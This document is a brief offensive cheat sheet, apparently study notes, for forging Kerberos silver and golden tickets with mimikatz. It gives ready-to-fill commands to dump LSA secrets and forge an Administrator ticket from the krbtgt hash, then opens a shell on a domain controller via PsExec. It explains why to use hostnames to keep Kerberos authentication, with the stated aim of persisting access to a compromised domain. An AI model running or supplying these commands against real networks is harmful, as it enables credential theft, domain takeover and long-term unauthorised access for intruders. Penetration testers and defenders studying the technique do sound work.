## Ticket Forgery

### Silver Ticket Forgery

If attempting to forge a silver ticket to hit a website, from within `mimikatz.exe`:
```
kerberos::golden /sid:<current user SID> /domain:<FQDN> /ptt /target:target-site.our.domain /service:http /rc4:<NTLM hash of user whose privilege we want to assume> /user:chumpasaurusUser
```

### Golden Ticket Forgery

If we have managed to own a domain controller, or a domain admin account, and we'd like to persist our access, then an ideal approach for us is to forge a so-called Golden Ticket. From `mimikatz.exe`:
```
privilege::debug
lsadump::lsa /patch
kerberos::purge
kerberos::golden /user:Administrator /domain:corp.com /sid:<Domain SID> /krbtgt:<krbtgt NTLM hash> /target:<target DC> /ptt
misc::cmd
```
```powershell
PsExec.exe \\domainController cmd.exe
```
Nb. for the command above it is important to note that this is just Overpass The Hash on steroids, and that its important for us to leverage the hostname rather than the IP address. This is because if we use the hostname we leverage Kerberos as the auth mechanism, which we have just owned courtesy of our Golden Ticket. However if we use an IP then we fall back to NTLM auth, within which we have no special privilege.